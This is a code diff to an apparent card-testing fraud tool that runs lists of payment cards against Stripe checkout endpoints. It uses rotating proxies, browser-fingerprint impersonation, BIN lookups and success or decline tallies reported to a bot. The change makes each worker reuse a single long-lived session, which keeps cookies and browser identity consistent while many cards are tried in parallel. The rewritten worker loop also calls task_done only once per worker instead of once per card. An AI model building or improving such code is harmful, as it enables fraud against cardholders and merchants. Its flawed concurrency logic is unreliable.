@@ -787,7 +787,7 @@ class StripeAPIHitter:
             await asyncio.sleep(0.5)
         return None
 
-    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None, cached_cookies: dict = None) -> Dict:
+    async def hit(self, card: Dict, attempt: int, user_id: int, cached_stripe_tokens: dict = None, cached_cookies: dict = None, session=None) -> Dict:
         start = time.time()
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None, 'raw_response': None}
         
@@ -841,13 +841,18 @@ class StripeAPIHitter:
                 if proxy_data and address.get('country'):
                     ProxyManager._geo_cache[proxy_data.get('server', '')] = address['country']
                 
-                # Step 0: Create browser session with persistent cookie jar
-                _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
-                _cffi_session_opened = True
+                # Step 0: Create browser session with persistent cookie jar (or reuse passed-in session)
+                if session is not None:
+                    _cffi_session = session
+                    _cffi_session_opened = False
+                else:
+                    _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
+                    _cffi_session_opened = True
+                
                 if proxies:
                     _cffi_session.proxies = proxies
 
-                if cached_cookies:
+                if cached_cookies and _cffi_session_opened:
                     for ck_name, ck_val in cached_cookies.items():
                         _cffi_session.cookies.set(ck_name, ck_val)
 
@@ -1503,10 +1508,12 @@ class StripeAPIHitter:
                         result['_session_cookies'] = dict(_cffi_session.cookies)
                     except Exception:
                         pass
-                    try:
-                        _cffi_session.close()
-                    except Exception:
-                        pass
+                    # Only close the session if it was created locally inside this hit call
+                    if _cffi_session_opened:
+                        try:
+                            _cffi_session.close()
+                        except Exception:
+                            pass
                 
         return result
 
@@ -1700,7 +1707,7 @@ class ConcurrentHitter:
             await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
         return False
 
-    async def _process_single_card(self, card: dict, attempt_num: int, queue: asyncio.Queue):
+    async def _process_single_card(self, card: dict, attempt_num: int, queue: asyncio.Queue, session=None):
         max_retries = 2
         bin_info = await BINLookup.lookup(card['card'])
         bin_country = bin_info.get('country', '')
@@ -1744,7 +1751,7 @@ class ConcurrentHitter:
             
             session_cookies = self._session_cookies
             
-            result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens, cached_cookies=session_cookies)
+            result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens, cached_cookies=session_cookies, session=session)
             
             # Cache the tokens and cookies returned from first card hit for reuse by all subsequent cards
             if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
@@ -1813,40 +1820,52 @@ class ConcurrentHitter:
             })
 
     async def _worker(self, queue: asyncio.Queue):
-        while self.is_running:
-            try:
-                card, attempt_num = queue.get_nowait()
-            except asyncio.QueueEmpty:
-                break
-                
-            try:
-                await self._process_single_card(card, attempt_num, queue)
-            except asyncio.CancelledError:
-                # Worker was cancelled. Clean exit.
-                return
-            except Exception as e:
-                import traceback
-                print(f"DEBUG: _worker processing card {card} failed completely: {str(e)}\n{traceback.format_exc()}", flush=True)
-                
-                # Race-condition guard for exception block too
-                if not self.is_running:
-                    return
+        # Create a single long-lived Session for this worker stream
+        worker_session = cffi_requests.Session(impersonate=self._stripe_profile["impersonate"])
+        # Set proxies if any profile-specific configurations require it
+        if self._session_cookies:
+            for ck_name, ck_val in self._session_cookies.items():
+                worker_session.cookies.set(ck_name, ck_val)
+        
+        try:
+            while self.is_running:
+                try:
+                    card, attempt_num = queue.get_nowait()
+                except asyncio.QueueEmpty:
+                    break
                     
-                async with self._counter_lock:
-                    self.completed += 1
-                    self.fails += 1
-                if self.update_callback:
-                    err_res = {'success': False, 'card': card, 'response_time': 0, 'decline_code': 'exception', 'error': f"Internal bot crash: {str(e)}"}
-                    await self.update_callback({
-                        "status": "progress",
-                        "result": err_res,
-                        "completed": self.completed,
-                        "total": self.total,
-                        "successes": self.successes,
-                        "fails": self.fails
-                    })
-            finally:
-                queue.task_done()
+                try:
+                    await self._process_single_card(card, attempt_num, queue, session=worker_session)
+                except asyncio.CancelledError:
+                    # Worker was cancelled. Clean exit.
+                    return
+        except Exception as e:
+            import traceback
+            print(f"DEBUG: _worker processing card failed completely: {str(e)}\n{traceback.format_exc()}", flush=True)
+            
+            # Race-condition guard for exception block too
+            if not self.is_running:
+                return
+                
+            async with self._counter_lock:
+                self.completed += 1
+                self.fails += 1
+            if self.update_callback:
+                err_res = {'success': False, 'card': None, 'response_time': 0, 'decline_code': 'exception', 'error': f"Internal bot crash: {str(e)}"}
+                await self.update_callback({
+                    "status": "progress",
+                    "result": err_res,
+                    "completed": self.completed,
+                    "total": self.total,
+                    "successes": self.successes,
+                    "fails": self.fails
+                })
+        finally:
+            queue.task_done()
+            try:
+                worker_session.close()
+            except Exception:
+                pass
     
     async def run(self):
         if self.update_callback:
@@ -1869,12 +1888,17 @@ class ConcurrentHitter:
         # 1. Pop and run the first card sequentially to initialize/warmup cookies and tokens
         if not queue.empty():
             first_card, first_attempt = queue.get_nowait()
+            warmup_session = cffi_requests.Session(impersonate=self._stripe_profile["impersonate"])
             try:
-                await self._process_single_card(first_card, first_attempt, queue)
+                await self._process_single_card(first_card, first_attempt, queue, session=warmup_session)
             except Exception as e:
                 import traceback
                 print(f"DEBUG: Sequential first card failed: {e}\n{traceback.format_exc()}")
             finally:
+                try:
+                    warmup_session.close()
+                except Exception:
+                    pass
                 queue.task_done()
             
         # 2. Run the remaining cards in parallel
